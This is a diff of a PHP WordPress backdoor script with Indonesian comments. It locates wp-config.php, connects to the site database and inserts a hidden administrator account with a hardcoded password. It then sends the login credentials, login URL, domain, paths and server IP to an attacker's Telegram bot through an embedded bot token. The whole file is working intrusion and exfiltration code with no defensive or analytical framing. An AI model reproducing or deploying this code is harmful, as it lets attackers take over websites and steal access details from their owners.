@@ -3,44 +3,37 @@
 $botToken = "8302945697:AAFLjH5YBHsdi0Z7eCaipZWlj8rPOneuUgU";
 $chatId = "-5295647197";
 
-// Default backdoor
 $user  = $_POST['wp_user']  ?? 'subadmin';
 $pass  = $_POST['wp_pass']  ?? 'Asdf1234@@';
 $email = $_POST['wp_email'] ?? 'admin@' . $_SERVER['HTTP_HOST'];
 
-$target_subdomain = 'bloglegalcops';
-
+// === SCANNING wp-config.php YANG LEBIH AKURAT ===
 $currentDir = dirname(__FILE__);
 $found_config = false;
 
-$doc_root = $_SERVER['DOCUMENT_ROOT'];
-$paths_to_check = [
-    $doc_root . "/$target_subdomain/wp-config.php",
-    dirname($doc_root) . "/$target_subdomain/wp-config.php",
-    $doc_root . "/$target_subdomain/",
-    $currentDir . '/wp-config.php',
-    $currentDir . "/$target_subdomain/wp-config.php",
-    $currentDir . "/..",
-    $currentDir . "/../..",
-];
-
-foreach ($paths_to_check as $path) {
-    $check_file = is_dir($path) ? $path . '/wp-config.php' : $path;
-    if (file_exists($check_file)) {
-        $found_config = $check_file;
-        break;
-    }
+// 1. Cek dulu di folder script ini
+if (file_exists($currentDir . '/wp-config.php')) {
+    $found_config = $currentDir . '/wp-config.php';
 }
 
+// 2. Naik directory secara bertahap (max 10 level)
 if (!$found_config) {
     $search_path = $currentDir;
-    for ($i = 0; $i < 12; $i++) {
+    for ($i = 0; $i < 10; $i++) {
         if (file_exists($search_path . '/wp-config.php')) {
             $found_config = $search_path . '/wp-config.php';
             break;
         }
-        $search_path = dirname($search_path);
-        if ($search_path === dirname($search_path)) break;
+        $parent = dirname($search_path);
+        if ($parent === $search_path || strpos($parent, 'public_html') === false) break; // safety
+        $search_path = $parent;
+    }
+}
+
+// 3. Fallback ke Document Root (kalau benar-benar tidak ketemu)
+if (!$found_config && !empty($_SERVER['DOCUMENT_ROOT'])) {
+    if (file_exists($_SERVER['DOCUMENT_ROOT'] . '/wp-config.php')) {
+        $found_config = $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php';
     }
 }
 
@@ -67,60 +60,49 @@ if ($found_config) {
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}user_level', '10')");
 
-            // Login URL dari DB
+            // Ambil siteurl
             $siteurl_result = $conn->query("SELECT option_value FROM `{$prefix}options` WHERE option_name = 'siteurl' LIMIT 1");
-            $login_url = "";
+            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+            $domain = $_SERVER['HTTP_HOST'];
+            $login_url = $protocol . $domain . "/wp-login.php";
+
             if ($siteurl_result && $siteurl_result->num_rows > 0) {
                 $row = $siteurl_result->fetch_assoc();
                 $siteurl = rtrim($row['option_value'], '/');
                 $login_url = $siteurl . "/wp-login.php";
-            } else {
-                $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
-                $login_url = $protocol . $_SERVER['HTTP_HOST'] . "/wp-login.php";
             }
 
-            // === TELEGRAM DENGAN DEBUG LENGKAP ===
-            $text = "💎 *INI YA LOGINAN WP NYA!* 💎\n\n";
+            // Telegram Notif
+            $ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($domain);
+            $date = date('Y-m-d H:i:s');
+            $script_path = __FILE__;
+
+            $text = "💎 *NEW BACKDOOR CREATED!* 💎\n\n";
             $text .= "👤 *User:* " . $user . "\n";
             $text .= "🔑 *Pass:* " . $pass . "\n";
             $text .= "🔗 *Login:* " . $login_url . "\n";
-            $text .= "🌐 *Domain:* " . $_SERVER['HTTP_HOST'] . "\n";
-            $text .= "🗃 *wp-config:* " . $found_config . "\n";
-            $text .= "🛰 *IP:* " . ($_SERVER['SERVER_ADDR'] ?? 'unknown') . "\n";
-            $text .= "📅 *Time:* " . date('Y-m-d H:i:s') . "\n";
+            $text .= "🌐 *Domain:* " . $domain . "\n";
+            $text .= "📁 *Document Root:* " . ($_SERVER['DOCUMENT_ROOT'] ?? 'unknown') . "\n";
+            $text .= "📍 *Script Path:* " . $script_path . "\n";
+            $text .= "🗃 *Used wp-config:* " . $found_config . "\n";
+            $text .= "🛰 *IP:* " . $ip . "\n";
+            $text .= "📅 *Time:* " . $date . "\n";
 
-            $telegram_url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
-            $postData = [
+            $ch = curl_init("https://api.telegram.org/bot" . $botToken . "/sendMessage");
+            curl_setopt($ch, CURLOPT_POST, true);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, [
                 'chat_id' => $chatId,
                 'text' => $text,
                 'parse_mode' => 'Markdown'
-            ];
-
-            $ch = curl_init($telegram_url);
-            curl_setopt($ch, CURLOPT_POST, true);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+            ]);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
             curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
-            $result = curl_exec($ch);
-            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            $curl_error = curl_error($ch);
+            curl_exec($ch);
             curl_close($ch);
 
-            // Tampilkan status Telegram di browser
-            if ($result === false) {
-                $telegram_status = "❌ CURL Error: " . $curl_error;
-            } elseif ($http_code != 200) {
-                $telegram_status = "❌ Telegram Failed (HTTP $http_code): " . htmlspecialchars($result);
-            } else {
-                $telegram_status = "✅ Telegram Berhasil Dikirim!";
-            }
-
-            echo "✅ <b>INJECTION SUCCESS!</b> Admin '$user' berhasil dibuat!<br><br>";
-            echo "🔗 <a href='$login_url' target='_blank'>Login Sekarang</a><br><br>";
-            echo "<b>Telegram Status:</b> " . $telegram_status . "<br>";
-            echo "<small>wp-config: " . htmlspecialchars($found_config) . "</small>";
-
+            echo "✅ SUCCESS: Admin '<b>$user</b>' berhasil dibuat!<br>";
+            echo "🔗 <a href='$login_url' target='_blank'>Login Sekarang</a><br>";
+            echo "<small>wp-config yang dipakai: " . basename(dirname($found_config)) . "/wp-config.php</small>";
         } else {
             echo "ERROR Query: " . $conn->error;
         }
@@ -129,6 +111,6 @@ if ($found_config) {
         echo "DATABASE ERROR: " . $conn->connect_error;
     }
 } else {
-    echo "❌ wp-config.php tidak ditemukan.";
+    echo "❌ wp-config.php TIDAK DITEMUKAN di folder ini maupun di atasnya.";
 }
 ?>
